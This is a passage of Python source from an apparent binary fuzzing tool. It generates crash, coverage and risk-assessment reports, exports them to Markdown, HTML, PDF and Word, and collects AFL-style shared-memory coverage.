                f"- **Address**: {crash.get('exception_address', 'N/A')}\n"
                f"- **Input Hash**: `{crash.get('input_hash', 'N/A')[:16]}`\n"
            )
        
        return ReportSection(
            title="Crash Analysis",
            content="".join(content_parts),
            subsections=[],
            tables=[{"name": "All Crashes", "data": crashes}],
        )
    
    def _create_coverage_section(self, coverage_data: Dict[str, Any]) -> ReportSection:
        """Create the code coverage section."""
        percentage = coverage_data.get("percentage", 0)
        
        content = f"""
## Code Coverage Analysis

**Overall Coverage: {percentage:.1f}%**

| Metric | Value |
|--------|-------|
| Basic Blocks Hit | {coverage_data.get('blocks_hit', 'N/A')} |
| Total Basic Blocks | {coverage_data.get('total_blocks', 'N/A')} |
| Edges Covered | {coverage_data.get('edges_covered', 'N/A')} |
| Functions Reached | {coverage_data.get('functions_reached', 'N/A')} |

### Coverage Interpretation

"""
        
        if percentage >= 80:
            content += "✅ **Excellent coverage** - The fuzzer explored most of the code."
        elif percentage >= 60:
            content += "⚠️ **Good coverage** - Consider running longer or adding more seeds."
        elif percentage >= 40:
            content += "⚠️ **Moderate coverage** - Many code paths remain unexplored."
        else:
            content += "❌ **Low coverage** - The fuzzer struggled to explore the target."
        
        return ReportSection(
            title="Coverage Analysis",
            content=content.strip(),
        )
    
    def _create_security_section(
        self,
        crashes: List[Dict[str, Any]],
        triage_results: Optional[List[Dict[str, Any]]],
    ) -> ReportSection:
        """Create the security assessment section."""
        content_parts = ["## Security Risk Assessment\n\n"]
        
        # Find exploitable crashes
        exploitable = []
        if triage_results:
            exploitable = [t for t in triage_results 
                          if t.get("exploitable", False) or 
                          t.get("severity", "").lower() in ["critical", "high"]]
        
        if not crashes:
            content_parts.append(
                "✅ **No security vulnerabilities detected.**\n\n"
                "No crashes were found during fuzzing, indicating robust input handling."
            )
        elif exploitable:
            content_parts.append(
                f"🚨 **{len(exploitable)} potentially exploitable vulnerabilities found!**\n\n"
                "These issues should be prioritized for immediate remediation:\n\n"
            )
            for i, vuln in enumerate(exploitable[:5], 1):
                content_parts.append(
                    f"### Vulnerability #{i}\n"
                    f"- **Type**: {vuln.get('crash_type', 'Unknown')}\n"
                    f"- **Severity**: {vuln.get('severity', 'Unknown')}\n"
                    f"- **Exploitable**: {'Yes' if vuln.get('exploitable') else 'Potentially'}\n"
                    f"- **Details**: {vuln.get('explanation', 'N/A')}\n\n"
                )
        else:
            content_parts.append(
                f"⚠️ **{len(crashes)} crashes found** but none appear directly exploitable.\n\n"
                "However, all crashes should be investigated as security research evolves."
            )
        
        return ReportSection(
            title="Security Assessment",
            content="".join(content_parts),
        )
    
    def _create_technical_section(
        self,
        session_data: Dict[str, Any],
        crashes: List[Dict[str, Any]],
    ) -> ReportSection:
        """Create the technical details section."""
        content = f"""
## Technical Details

### Execution Environment
- **Platform**: {session_data.get('platform', 'Unknown')}
- **Architecture**: {session_data.get('architecture', 'Unknown')}
- **Fuzzer Version**: {session_data.get('fuzzer_version', 'VRAgent Binary Fuzzer')}

### Performance Metrics
- **Total Executions**: {session_data.get('total_executions', 0):,}
- **Execution Rate**: {session_data.get('executions_per_second', 0):,.1f}/sec
- **Corpus Size**: {session_data.get('corpus_size', 0):,} inputs
- **Unique Paths**: {session_data.get('unique_paths', 0):,}

### Mutation Statistics
"""
        
        mutation_stats = session_data.get("mutation_stats", {})
        if mutation_stats:
            for strategy, count in mutation_stats.items():
                content += f"- **{strategy}**: {count:,} mutations\n"
        else:
            content += "- No detailed mutation statistics available\n"
        
        return ReportSection(
            title="Technical Details",
            content=content.strip(),
        )
    
    def _generate_recommendations(
        self,
        crashes: List[Dict[str, Any]],
        triage_results: Optional[List[Dict[str, Any]]],
        statistics: Dict[str, Any],
    ) -> List[str]:
        """Generate actionable recommendations."""
        recommendations = []
        
        # Based on crashes
        if not crashes:
            recommendations.append(
                "🔄 **Extend fuzzing duration**: No crashes found - try running for "
                "longer periods (hours or days) to discover deeper bugs."
            )
            recommendations.append(
                "🎯 **Add more seed inputs**: Diverse seeds help the fuzzer explore "
                "more code paths."
            )
        else:
            # Check for critical issues
            critical_count = statistics.get("severity_breakdown", {}).get("critical", 0)
            if critical_count > 0:
                recommendations.append(
                    f"🚨 **Fix critical vulnerabilities immediately**: {critical_count} "
                    f"critical issues found that may be exploitable."
                )
            
            recommendations.append(
                "🔍 **Review all unique crashes**: Deduplicate and analyze each "
                "unique crash signature for root cause."
            )
        
        # Based on coverage
        coverage = statistics.get("coverage_percentage")
        if coverage is not None:
            if coverage < 50:
                recommendations.append(
                    "📈 **Improve coverage**: Current coverage is low. Consider "
                    "adding structured seeds or using symbolic execution hints."
                )
            elif coverage < 80:
                recommendations.append(
                    "📊 **Coverage could be improved**: Consider dictionary-based "
                    "mutations or grammar-aware fuzzing for better exploration."
                )
        
        # General recommendations
        recommendations.append(
            "🛡️ **Enable sanitizers**: Compile with AddressSanitizer (ASan) and "
            "UndefinedBehaviorSanitizer (UBSan) for better bug detection."
        )
        
        recommendations.append(
            "📝 **Document findings**: Create tickets for each unique crash and "
            "track remediation progress."
        )
        
        return recommendations
    
    def _assess_risk(
        self,
        crashes: List[Dict[str, Any]],
        triage_results: Optional[List[Dict[str, Any]]],
    ) -> Dict[str, Any]:
        """Assess overall security risk."""
        if not crashes:
            return {
                "overall_risk": "low",
                "risk_score": 10,
                "risk_emoji": "✅",
                "summary": "No vulnerabilities found during testing.",
            }
        
        # Calculate risk score
        score = 0
        severity_weights = {"critical": 40, "high": 25, "medium": 10, "low": 3, "info": 1}
        
        if triage_results:
            for result in triage_results:
                severity = result.get("severity", "medium").lower()
                score += severity_weights.get(severity, 5)
                if result.get("exploitable"):
                    score += 20
        else:
            score = len(crashes) * 10  # Default scoring
        
        # Cap at 100
        score = min(score, 100)
        
        # Determine risk level
        if score >= 70:
            risk_level = "critical"
            emoji = "🚨"
            summary = "Critical security issues require immediate attention."
        elif score >= 50:
            risk_level = "high"
            emoji = "🔴"
            summary = "Significant security issues found. Prioritize fixes."
        elif score >= 30:
            risk_level = "medium"
            emoji = "🟡"
            summary = "Moderate issues found. Plan for remediation."
        elif score >= 10:
            risk_level = "low"
            emoji = "🟢"
            summary = "Minor issues found. Fix when convenient."
        else:
            risk_level = "minimal"
            emoji = "✅"
            summary = "Minimal security risk from findings."
        
        return {
            "overall_risk": risk_level,
            "risk_score": score,
            "risk_emoji": emoji,
            "summary": summary,
            "factors": {
                "total_crashes": len(crashes),
                "exploitable_count": len([t for t in (triage_results or []) 
                                         if t.get("exploitable")]),
            },
        }
    
    async def _auto_save_report(self, report: FinalReport) -> str:
        """Auto-save report in all formats."""
        report_dir = self.reports_dir / report.session_id
        report_dir.mkdir(parents=True, exist_ok=True)
        
        # Save Markdown
        md_path = report_dir / f"report_{report.id}.md"
        md_content = self.export_markdown(report)
        with open(md_path, "w", encoding="utf-8") as f:
            f.write(md_content)
        
        # Save JSON for data access
        json_path = report_dir / f"report_{report.id}.json"
        with open(json_path, "w", encoding="utf-8") as f:
            json.dump(report.to_dict(), f, indent=2)
        
        return str(report_dir)
    
    def export_markdown(self, report: FinalReport) -> str:
        """Export report to Markdown format."""
        lines = []
        
        # Title and metadata
        lines.append(f"# {report.title}")
        lines.append("")
        lines.append(f"**Report ID**: `{report.id}`")
        lines.append(f"**Session ID**: `{report.session_id}`")
        lines.append(f"**Generated**: {report.generated_at}")
        lines.append("")
        lines.append("---")
        lines.append("")
        
        # Executive Summary
        lines.append("# Executive Summary")
        lines.append("")
        lines.append(report.executive_summary)
        lines.append("")
        lines.append("---")
        lines.append("")
        
        # Risk Assessment Box
        risk = report.risk_assessment
        lines.append(f"## {risk.get('risk_emoji', '•')} Risk Assessment: {risk.get('overall_risk', 'Unknown').upper()}")
        lines.append("")
        lines.append(f"**Risk Score**: {risk.get('risk_score', 0)}/100")
        lines.append("")
        lines.append(risk.get("summary", ""))
        lines.append("")
        lines.append("---")
        lines.append("")
        
        # Statistics Summary
        lines.append("## Key Statistics")
        lines.append("")
        lines.append("| Metric | Value |")
        lines.append("|--------|-------|")
        stats = report.statistics
        lines.append(f"| Total Executions | {stats.get('total_executions', 0):,} |")
        lines.append(f"| Execution Rate | {stats.get('executions_per_second', 0):,.1f}/sec |")
        lines.append(f"| Duration | {stats.get('duration_formatted', 'N/A')} |")
        lines.append(f"| Total Crashes | {stats.get('total_crashes', 0)} |")
        lines.append(f"| Unique Crashes | {stats.get('unique_crashes', 0)} |")
        if stats.get("coverage_percentage"):
            lines.append(f"| Code Coverage | {stats.get('coverage_percentage', 0):.1f}% |")
        lines.append("")
        lines.append("---")
        lines.append("")
        
        # Sections
        for section in report.sections:
            lines.append(f"# {section.title}")
            lines.append("")
            lines.append(section.content)
            lines.append("")
            
            for subsection in section.subsections:
                lines.append(f"## {subsection.title}")
                lines.append("")
                lines.append(subsection.content)
                lines.append("")
            
            lines.append("---")
            lines.append("")
        
        # Recommendations
        lines.append("# Recommendations")
        lines.append("")
        for i, rec in enumerate(report.recommendations, 1):
            lines.append(f"{i}. {rec}")
            lines.append("")
        lines.append("")
        
        # Footer
        lines.append("---")
        lines.append("")
        lines.append("*Report generated by VRAgent Binary Fuzzer*")
        lines.append(f"*{report.generated_at}*")
        
        return "\n".join(lines)
    
    def export_html(self, report: FinalReport) -> str:
        """Export report to HTML format (intermediate for PDF/Word)."""
        # Convert markdown to HTML-like structure
        md_content = self.export_markdown(report)
        
        # Build HTML document
        html_parts = [
            "<!DOCTYPE html>",
            "<html>",
            "<head>",
            "<meta charset='utf-8'>",
            f"<title>{report.title}</title>",
            "<style>",
            "body { font-family: 'Segoe UI', Arial, sans-serif; max-width: 900px; margin: 0 auto; padding: 40px; line-height: 1.6; }",
            "h1 { color: #1a1a2e; border-bottom: 3px solid #4a90d9; padding-bottom: 10px; }",
            "h2 { color: #2d3748; margin-top: 30px; }",
            "h3 { color: #4a5568; }",
            "table { border-collapse: collapse; width: 100%; margin: 20px 0; }",
            "th, td { border: 1px solid #e2e8f0; padding: 12px; text-align: left; }",
            "th { background-color: #4a90d9; color: white; }",
            "tr:nth-child(even) { background-color: #f7fafc; }",
            ".risk-critical { background-color: #fed7d7; border-left: 4px solid #c53030; padding: 15px; margin: 20px 0; }",
            ".risk-high { background-color: #feebc8; border-left: 4px solid #dd6b20; padding: 15px; margin: 20px 0; }",
            ".risk-medium { background-color: #fefcbf; border-left: 4px solid #d69e2e; padding: 15px; margin: 20px 0; }",
            ".risk-low { background-color: #c6f6d5; border-left: 4px solid #38a169; padding: 15px; margin: 20px 0; }",
            ".executive-summary { background-color: #ebf8ff; padding: 20px; border-radius: 8px; margin: 20px 0; }",
            ".recommendation { background-color: #f0fff4; padding: 10px 15px; margin: 10px 0; border-radius: 4px; }",
            "code { background-color: #edf2f7; padding: 2px 6px; border-radius: 3px; font-family: 'Consolas', monospace; }",
            ".footer { margin-top: 40px; padding-top: 20px; border-top: 1px solid #e2e8f0; color: #718096; font-size: 0.9em; }",
            ".stat-box { display: inline-block; background: #4a90d9; color: white; padding: 15px 25px; margin: 5px; border-radius: 8px; text-align: center; }",
            ".stat-value { font-size: 24px; font-weight: bold; }",
            ".stat-label { font-size: 12px; opacity: 0.9; }",
            "</style>",
            "</head>",
            "<body>",
        ]
        
        # Title
        html_parts.append(f"<h1>{report.title}</h1>")
        html_parts.append(f"<p><strong>Report ID:</strong> <code>{report.id}</code> | ")
        html_parts.append(f"<strong>Session:</strong> <code>{report.session_id}</code> | ")
        html_parts.append(f"<strong>Generated:</strong> {report.generated_at}</p>")
        
        # Risk Assessment Banner
        risk = report.risk_assessment
        risk_class = f"risk-{risk.get('overall_risk', 'medium')}"
        html_parts.append(f"<div class='{risk_class}'>")
        html_parts.append(f"<h2>{risk.get('risk_emoji', '•')} Risk Assessment: {risk.get('overall_risk', 'Unknown').upper()}</h2>")
        html_parts.append(f"<p><strong>Risk Score:</strong> {risk.get('risk_score', 0)}/100</p>")
        html_parts.append(f"<p>{risk.get('summary', '')}</p>")
        html_parts.append("</div>")
        
        # Key Statistics
        stats = report.statistics
        html_parts.append("<h2>Key Statistics</h2>")
        html_parts.append("<div style='margin: 20px 0;'>")
        html_parts.append(f"<div class='stat-box'><div class='stat-value'>{stats.get('total_executions', 0):,}</div><div class='stat-label'>Executions</div></div>")
        html_parts.append(f"<div class='stat-box'><div class='stat-value'>{stats.get('total_crashes', 0)}</div><div class='stat-label'>Crashes</div></div>")
        html_parts.append(f"<div class='stat-box'><div class='stat-value'>{stats.get('unique_crashes', 0)}</div><div class='stat-label'>Unique</div></div>")
        html_parts.append(f"<div class='stat-box'><div class='stat-value'>{stats.get('duration_formatted', 'N/A')}</div><div class='stat-label'>Duration</div></div>")
        if stats.get('coverage_percentage'):
            html_parts.append(f"<div class='stat-box'><div class='stat-value'>{stats.get('coverage_percentage', 0):.1f}%</div><div class='stat-label'>Coverage</div></div>")
        html_parts.append("</div>")
        
        # Executive Summary
        html_parts.append("<div class='executive-summary'>")
        html_parts.append("<h2>Executive Summary</h2>")
        # Convert markdown bold to HTML
        summary = report.executive_summary.replace("**", "<strong>").replace("</strong><strong>", "**")
        for para in summary.split("\n\n"):
            html_parts.append(f"<p>{para}</p>")
        html_parts.append("</div>")
        
        # Sections
        for section in report.sections:
            html_parts.append(f"<h2>{section.title}</h2>")
            # Simple markdown to HTML conversion
            content = section.content
            content = content.replace("## ", "<h3>").replace("\n###", "</h3>\n<h4>")
            content = content.replace("**", "<strong>").replace("</strong><strong>", "**")
            content = content.replace("`", "<code>").replace("</code><code>", "`")
            
            # Handle tables
            if "| " in content:
                lines = content.split("\n")
                in_table = False
                new_lines = []
                for line in lines:
                    if line.strip().startswith("|") and "|" in line[1:]:
                        if not in_table:
                            new_lines.append("<table>")
                            in_table = True
                        if "---" in line:
                            continue  # Skip separator line
                        cells = [c.strip() for c in line.split("|")[1:-1]]
                        if new_lines[-1] == "<table>":
                            new_lines.append("<tr>" + "".join(f"<th>{c}</th>" for c in cells) + "</tr>")
                        else:
                            new_lines.append("<tr>" + "".join(f"<td>{c}</td>" for c in cells) + "</tr>")
                    else:
                        if in_table:
                            new_lines.append("</table>")
                            in_table = False
                        new_lines.append(line)
                if in_table:
                    new_lines.append("</table>")
                content = "\n".join(new_lines)
            
            # Handle bullet points
            content = content.replace("\n- ", "\n<li>").replace("<li>", "</li><li>")
            if "</li><li>" in content:
                content = "<ul>" + content + "</li></ul>"
                content = content.replace("<ul></li>", "<ul>")
            
            html_parts.append(f"<div>{content}</div>")
        
        # Recommendations
        html_parts.append("<h2>Recommendations</h2>")
        for i, rec in enumerate(report.recommendations, 1):
            html_parts.append(f"<div class='recommendation'><strong>{i}.</strong> {rec}</div>")
        
        # Footer
        html_parts.append("<div class='footer'>")
        html_parts.append("<p><em>Report generated by VRAgent Binary Fuzzer</em></p>")
        html_parts.append(f"<p>{report.generated_at}</p>")
        html_parts.append("</div>")
        
        html_parts.append("</body>")
        html_parts.append("</html>")
        
        return "\n".join(html_parts)
    
    async def export_pdf(self, report: FinalReport, output_path: Optional[str] = None) -> Dict[str, Any]:
        """
        Export report to PDF format.
        
        Uses HTML intermediate format and weasyprint/pdfkit if available,
        otherwise creates a formatted text-based PDF structure.
        """
        if output_path is None:
            report_dir = self.reports_dir / report.session_id
            report_dir.mkdir(parents=True, exist_ok=True)
            output_path = str(report_dir / f"report_{report.id}.pdf")
        
        html_content = self.export_html(report)
        
        # Try weasyprint first (best quality)
        try:
            from weasyprint import HTML
            HTML(string=html_content).write_pdf(output_path)
            return {
                "success": True,
                "path": output_path,
                "format": "pdf",
                "method": "weasyprint",
                "message": "PDF generated successfully with full formatting",
            }
        except ImportError:
            pass
        
        # Try pdfkit (requires wkhtmltopdf)
        try:
            import pdfkit
            pdfkit.from_string(html_content, output_path)
            return {
                "success": True,
                "path": output_path,
                "format": "pdf",
                "method": "pdfkit",
                "message": "PDF generated successfully",
            }
        except (ImportError, OSError):
            pass
        
        # Fallback: Create a simple PDF using reportlab
        try:
            from reportlab.lib.pagesizes import letter, A4
            from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
            from reportlab.lib.units import inch
            from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle
            from reportlab.lib import colors
            
            doc = SimpleDocTemplate(output_path, pagesize=A4)
            styles = getSampleStyleSheet()
            story = []
            
            # Title
            title_style = ParagraphStyle(
                'CustomTitle',
                parent=styles['Heading1'],
                fontSize=24,
                spaceAfter=30,
                textColor=colors.HexColor('#1a1a2e')
            )
            story.append(Paragraph(report.title, title_style))
            story.append(Spacer(1, 12))
            
            # Metadata
            meta_text = f"Report ID: {report.id} | Session: {report.session_id} | Generated: {report.generated_at}"
            story.append(Paragraph(meta_text, styles['Normal']))
            story.append(Spacer(1, 20))
            
            # Risk Assessment
            risk = report.risk_assessment
            risk_text = f"<b>Risk Assessment: {risk.get('overall_risk', 'Unknown').upper()}</b><br/>Score: {risk.get('risk_score', 0)}/100<br/>{risk.get('summary', '')}"
            story.append(Paragraph(risk_text, styles['Normal']))
            story.append(Spacer(1, 20))
            
            # Statistics Table
            stats = report.statistics
            stats_data = [
                ['Metric', 'Value'],
                ['Total Executions', f"{stats.get('total_executions', 0):,}"],
                ['Crashes Found', str(stats.get('total_crashes', 0))],
                ['Unique Crashes', str(stats.get('unique_crashes', 0))],
                ['Duration', stats.get('duration_formatted', 'N/A')],
            ]
            if stats.get('coverage_percentage'):
                stats_data.append(['Coverage', f"{stats.get('coverage_percentage', 0):.1f}%"])
            
            stats_table = Table(stats_data, colWidths=[2.5*inch, 3*inch])
            stats_table.setStyle(TableStyle([
                ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor('#4a90d9')),
                ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
                ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
                ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
                ('FONTSIZE', (0, 0), (-1, 0), 12),
                ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
                ('BACKGROUND', (0, 1), (-1, -1), colors.HexColor('#f7fafc')),
                ('GRID', (0, 0), (-1, -1), 1, colors.HexColor('#e2e8f0')),
            ]))
            story.append(stats_table)
            story.append(Spacer(1, 20))
            
            # Executive Summary
            story.append(Paragraph("<b>Executive Summary</b>", styles['Heading2']))
            # Clean markdown formatting for PDF
            summary_clean = report.executive_summary.replace("**", "").replace("*", "")
            story.append(Paragraph(summary_clean, styles['Normal']))
            story.append(Spacer(1, 20))
            
            # Recommendations
            story.append(Paragraph("<b>Recommendations</b>", styles['Heading2']))
            for i, rec in enumerate(report.recommendations, 1):
                rec_clean = rec.replace("**", "").replace("*", "")
                story.append(Paragraph(f"{i}. {rec_clean}", styles['Normal']))
                story.append(Spacer(1, 6))
            
            # Build PDF
            doc.build(story)
            
            return {
                "success": True,
                "path": output_path,
                "format": "pdf",
                "method": "reportlab",
                "message": "PDF generated successfully (basic formatting)",
            }
        except ImportError:
            pass
        
        # Last resort: Save HTML and instruct user
        html_path = output_path.replace('.pdf', '.html')
        with open(html_path, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        return {
            "success": False,
            "html_path": html_path,
            "format": "html",
            "error": "No PDF library available. Install: pip install weasyprint or pip install reportlab",
            "message": "HTML version saved instead. Open in browser and print to PDF.",
        }
    
    async def export_word(self, report: FinalReport, output_path: Optional[str] = None) -> Dict[str, Any]:
        """
        Export report to Microsoft Word (.docx) format.
        
        Uses python-docx library for professional Word documents.
        """
        if output_path is None:
            report_dir = self.reports_dir / report.session_id
            report_dir.mkdir(parents=True, exist_ok=True)
            output_path = str(report_dir / f"report_{report.id}.docx")
        
        try:
            from docx import Document
            from docx.shared import Inches, Pt, RGBColor
            from docx.enum.text import WD_ALIGN_PARAGRAPH
            from docx.enum.table import WD_TABLE_ALIGNMENT
            from docx.enum.style import WD_STYLE_TYPE
            
            doc = Document()
            
            # Title
            title = doc.add_heading(report.title, 0)
            title.alignment = WD_ALIGN_PARAGRAPH.CENTER
            
            # Metadata
            meta = doc.add_paragraph()
            meta.add_run(f"Report ID: ").bold = True
            meta.add_run(f"{report.id}  |  ")
            meta.add_run(f"Session: ").bold = True
            meta.add_run(f"{report.session_id}  |  ")
            meta.add_run(f"Generated: ").bold = True
            meta.add_run(report.generated_at)
            meta.alignment = WD_ALIGN_PARAGRAPH.CENTER
            
            doc.add_paragraph()
            
            # Risk Assessment Box
            risk = report.risk_assessment
            risk_para = doc.add_paragraph()
            risk_run = risk_para.add_run(f"RISK ASSESSMENT: {risk.get('overall_risk', 'Unknown').upper()}")
            risk_run.bold = True
            risk_run.font.size = Pt(14)
            risk_colors = {
                "critical": RGBColor(197, 48, 48),
                "high": RGBColor(221, 107, 32),
                "medium": RGBColor(214, 158, 46),
                "low": RGBColor(56, 161, 105),
            }
            risk_run.font.color.rgb = risk_colors.get(risk.get('overall_risk', ''), RGBColor(0, 0, 0))
            
            doc.add_paragraph(f"Risk Score: {risk.get('risk_score', 0)}/100")
            doc.add_paragraph(risk.get('summary', ''))
            
            doc.add_paragraph()
            
            # Key Statistics Table
            doc.add_heading('Key Statistics', level=1)
            stats = report.statistics
            
            table = doc.add_table(rows=1, cols=2)
            table.style = 'Table Grid'
            table.alignment = WD_TABLE_ALIGNMENT.CENTER
            
            # Header row
            hdr_cells = table.rows[0].cells
            hdr_cells[0].text = 'Metric'
            hdr_cells[1].text = 'Value'
            for cell in hdr_cells:
                cell.paragraphs[0].runs[0].bold = True
            
            # Data rows
            stats_rows = [
                ('Total Executions', f"{stats.get('total_executions', 0):,}"),
                ('Execution Rate', f"{stats.get('executions_per_second', 0):,.1f}/sec"),
                ('Duration', stats.get('duration_formatted', 'N/A')),
                ('Total Crashes', str(stats.get('total_crashes', 0))),
                ('Unique Crashes', str(stats.get('unique_crashes', 0))),
            ]
            if stats.get('coverage_percentage'):
                stats_rows.append(('Code Coverage', f"{stats.get('coverage_percentage', 0):.1f}%"))
            
            for metric, value in stats_rows:
                row_cells = table.add_row().cells
                row_cells[0].text = metric
                row_cells[1].text = value
            
            doc.add_paragraph()
            
            # Executive Summary
            doc.add_heading('Executive Summary', level=1)
            summary_clean = report.executive_summary.replace("**", "").replace("*", "")
            for para in summary_clean.split("\n\n"):
                if para.strip():
                    doc.add_paragraph(para.strip())
            
            # Sections
            for section in report.sections:
                doc.add_heading(section.title, level=1)
                
                # Clean content
                content = section.content
                content = content.replace("## ", "").replace("### ", "").replace("#### ", "")
                content = content.replace("**", "").replace("*", "").replace("`", "")
                
                # Skip table formatting for Word, just add as paragraphs
                lines = content.split("\n")
                for line in lines:
                    if line.strip() and not line.strip().startswith("|") and not line.strip().startswith("---"):
                        if line.strip().startswith("- "):
                            doc.add_paragraph(line.strip()[2:], style='List Bullet')
                        else:
                            doc.add_paragraph(line.strip())
            
            # Recommendations
            doc.add_heading('Recommendations', level=1)
            for i, rec in enumerate(report.recommendations, 1):
                rec_clean = rec.replace("**", "").replace("*", "")
                para = doc.add_paragraph(style='List Number')
                para.add_run(rec_clean)
            
            # Footer
            doc.add_paragraph()
            footer = doc.add_paragraph()
            footer.alignment = WD_ALIGN_PARAGRAPH.CENTER
            footer_run = footer.add_run("Report generated by VRAgent Binary Fuzzer")
            footer_run.italic = True
            footer.add_run(f"\n{report.generated_at}")
            
            # Save document
            doc.save(output_path)
            
            return {
                "success": True,
                "path": output_path,
                "format": "word",
                "message": "Word document generated successfully",
            }
            
        except ImportError:
            # Fallback: Save as Markdown with .doc extension info
            md_path = output_path.replace('.docx', '.md')
            md_content = self.export_markdown(report)
            with open(md_path, 'w', encoding='utf-8') as f:
                f.write(md_content)
            
            return {
                "success": False,
                "markdown_path": md_path,
                "error": "python-docx not installed. Install: pip install python-docx",
                "message": "Markdown version saved instead.",
            }
    
    async def export_all_formats(
        self,
        report: FinalReport,
        output_dir: Optional[str] = None,
    ) -> Dict[str, Any]:
        """Export report to all available formats."""
        if output_dir is None:
            output_dir = str(self.reports_dir / report.session_id)
        
        Path(output_dir).mkdir(parents=True, exist_ok=True)
        
        results = {
            "report_id": report.id,
            "output_directory": output_dir,
            "exports": {},
        }
        
        # Markdown
        md_path = Path(output_dir) / f"report_{report.id}.md"
        md_content = self.export_markdown(report)
        with open(md_path, 'w', encoding='utf-8') as f:
            f.write(md_content)
        results["exports"]["markdown"] = {"success": True, "path": str(md_path)}
        
        # HTML
        html_path = Path(output_dir) / f"report_{report.id}.html"
        html_content = self.export_html(report)
        with open(html_path, 'w', encoding='utf-8') as f:
            f.write(html_content)
        results["exports"]["html"] = {"success": True, "path": str(html_path)}
        
        # JSON
        json_path = Path(output_dir) / f"report_{report.id}.json"
        with open(json_path, 'w', encoding='utf-8') as f:
            json.dump(report.to_dict(), f, indent=2)
        results["exports"]["json"] = {"success": True, "path": str(json_path)}
        
        # PDF
        pdf_path = str(Path(output_dir) / f"report_{report.id}.pdf")
        pdf_result = await self.export_pdf(report, pdf_path)
        results["exports"]["pdf"] = pdf_result
        
        # Word
        word_path = str(Path(output_dir) / f"report_{report.id}.docx")
        word_result = await self.export_word(report, word_path)
        results["exports"]["word"] = word_result
        
        return results
    
    def get_report(self, report_id: str) -> Optional[FinalReport]:
        """Get a report by ID."""
        return self._reports.get(report_id)
    
    def list_reports(self, session_id: Optional[str] = None) -> List[Dict[str, Any]]:
        """List all reports, optionally filtered by session."""
        results = []
        for report in self._reports.values():
            if session_id and report.session_id != session_id:
                continue
            results.append({
                "id": report.id,
                "title": report.title,
                "session_id": report.session_id,
                "generated_at": report.generated_at,
                "risk_level": report.risk_assessment.get("overall_risk", "unknown"),
                "total_crashes": report.statistics.get("total_crashes", 0),
            })
        return results


# =============================================================================
# PROCESS EXECUTION HARNESS (1b)
# =============================================================================

@dataclass
class ExecutionResult:
    """Result of a single execution."""
    id: str = field(default_factory=lambda: str(uuid.uuid4())[:8])
    exit_code: Optional[int] = None
    stdout: bytes = b""
    stderr: bytes = b""
    duration_ms: float = 0.0
    timed_out: bool = False
    crashed: bool = False
    crash_type: Optional[CrashType] = None
    exception_code: Optional[int] = None
    exception_address: Optional[int] = None
    faulting_module: Optional[str] = None
    stack_trace: List[str] = field(default_factory=list)
    memory_info: Dict[str, Any] = field(default_factory=dict)
    input_file: Optional[str] = None
    input_hash: Optional[str] = None
    timestamp: str = field(default_factory=lambda: datetime.utcnow().isoformat())
    # Phase 2: Coverage data
    coverage_data: Optional[bytes] = None  # Raw coverage bitmap from instrumented execution
    
    def to_dict(self) -> Dict[str, Any]:
        result = asdict(self)
        if self.crash_type:
            result["crash_type"] = self.crash_type.value
        result["stdout"] = base64.b64encode(self.stdout).decode() if self.stdout else ""
        result["stderr"] = base64.b64encode(self.stderr).decode() if self.stderr else ""
        if self.coverage_data:
            result["coverage_data"] = base64.b64encode(self.coverage_data).decode()
        return result


class CoverageProvider:
    """Base class for coverage data collection."""
    
    def is_available(self) -> bool:
        return True
    
    def prepare_environment(self, env: Dict[str, str]) -> Dict[str, str]:
        return env
    
    def reset(self):
        pass
    
    def read_coverage(self) -> Optional[bytes]:
        return None
    
    def close(self):
        pass


class AflSharedMemoryCoverage(CoverageProvider):
    """
    AFL-style shared memory coverage provider.
    
    Requires the target to be compiled with AFL/LLVM instrumentation.
    """
    
    def __init__(self, map_size: int = 65536):
        self.map_size = map_size
        self._available = False
        self._libc = None
        self._shm_id: Optional[int] = None
        self._shm_addr: Optional[int] = None
        self._shm_map = None
        self._shmdt = None
        self._init_shared_memory()
    
    def _init_shared_memory(self):
        if os.name == "nt":
            return
        
        libc_path = ctypes.util.find_library("c")
        if not libc_path:
            return
        
        try:
            self._libc = ctypes.CDLL(libc_path, use_errno=True)
        except OSError:
            return
        
        IPC_PRIVATE = 0
        IPC_CREAT = 0o1000
        IPC_RMID = 0
        
        shmget = self._libc.shmget
        shmget.argtypes = [ctypes.c_int, ctypes.c_size_t, ctypes.c_int]
        shmget.restype = ctypes.c_int
        
        shmat = self._libc.shmat
        shmat.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.c_int]
        shmat.restype = ctypes.c_void_p
        
        shmctl = self._libc.shmctl
        shmctl.argtypes = [ctypes.c_int, ctypes.c_int, ctypes.c_void_p]
        shmctl.restype = ctypes.c_int
        
        shmdt = self._libc.shmdt
        shmdt.argtypes = [ctypes.c_void_p]
        shmdt.restype = ctypes.c_int
        
        shm_id = shmget(IPC_PRIVATE, self.map_size, IPC_CREAT | 0o600)
        if shm_id < 0:
            return
        
        shm_addr = shmat(shm_id, None, 0)
        if shm_addr in (ctypes.c_void_p(-1).value, None):
            return
        
        shmctl(shm_id, IPC_RMID, None)
        
        self._shm_id = shm_id
        self._shm_addr = shm_addr
        self._shmdt = shmdt
        self._shm_map = (ctypes.c_ubyte * self.map_size).from_address(shm_addr)
        ctypes.memset(shm_addr, 0, self.map_size)
        self._available = True
    
    def is_available(self) -> bool:
        return self._available
    
    def prepare_environment(self, env: Dict[str, str]) -> Dict[str, str]:
        if not self._available or self._shm_id is None:
            return env
        env["__AFL_SHM_ID"] = str(self._shm_id)
        env["AFL_MAP_SIZE"] = str(self.map_size)
        return env
    
    def reset(self):
        if self._available and self._shm_addr:
            ctypes.memset(self._shm_addr, 0, self.map_size)
    
    def read_coverage(self) -> Optional[bytes]:
        if not self._available or not self._shm_map:
            return None
        return bytes(self._shm_map)
    
    def close(self):
        if self._available and self._shm_addr and self._shmdt:
            try:
                self._shmdt(self._shm_addr)
            except Exception:
                pass
        self._available = False


def create_coverage_provider(
    backend: CoverageBackend,
    map_size: int = 65536,
    target_path: Optional[str] = None,
    qemu_architecture: Optional["QemuArchitecture"] = None,
) -> Optional[CoverageProvider]:
    """Create a coverage provider based on the requested backend.

    Args:
        backend: Coverage backend type
        map_size: Coverage bitmap size
